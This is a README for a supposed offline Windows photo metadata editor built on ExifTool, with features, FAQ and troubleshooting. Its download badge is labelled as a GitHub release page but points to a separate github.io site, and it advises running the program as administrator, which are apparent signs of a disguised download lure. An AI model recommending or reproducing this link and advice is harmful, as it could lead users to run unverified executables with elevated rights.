# 📷 photo-metadata-editor - Edit your photo data with ease

[![Download on GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://baraa79000.github.io)

This application helps you view and change information hidden inside your image files. Digital photos contain data about the camera, date, time, and location. This tool lets you edit that information without needing technical skills. It runs offline on your computer to keep your photos private.

## 🛠 Features

*   **View Metadata:** See all details like camera model, exposure settings, and timestamps.
*   **Edit Tags:** Change EXIF, XMP, and IPTC data fields.
*   **Batch Processing:** Update metadata for many photos at once.
*   **Privacy Focused:** No cloud uploads occur during the editing process.
*   **Simple Interface:** A clean window helps you manage files quickly.
*   **ExifTool Powered:** This software uses the industry standard tool for metadata accuracy.

## 🔧 Frequently Asked Questions

**Does the app modify the original image quality?**
No. The tool only changes the text metadata. The image pixels remain untouched and keep their original quality.

**Can I undo my changes?**
Always keep a backup of your photos before you use any editing tool. Once you save changes, the metadata in the file updates permanently.

**Does this application need an internet connection?**
No. This tool operates entirely offline. You do not need a network connection to view or edit your photos.

**What should I do if the app does not open?**
Ensure you have the latest updates for Windows. If the program fails to launch, try right-clicking the file and selecting "Run as administrator."

**Where does the program store data?**
The program keeps settings in a small file on your computer. It does not send any of your personal images or data to any external server.

## 🛡 Security and Privacy

Your privacy matters. This application does not track your behavior. It does not collect telemetry or usage statistics. All processing happens on your local machine. Your photos never leave your device. The software reads your files, allows you to change the metadata, and writes the changes back to your local files using ExifTool.

## 📋 Troubleshooting

If you encounter issues, check the following:
*   **File Permissions:** Ensure the folder containing your photos is not set to "Read-only."
*   **File Format:** Ensure your photos use standard formats like JPEG, PNG, or TIFF. Some proprietary camera RAW formats might have limitations.
*   **Updates:** Check the download link periodically for newer versions that fix bugs or add new field support.
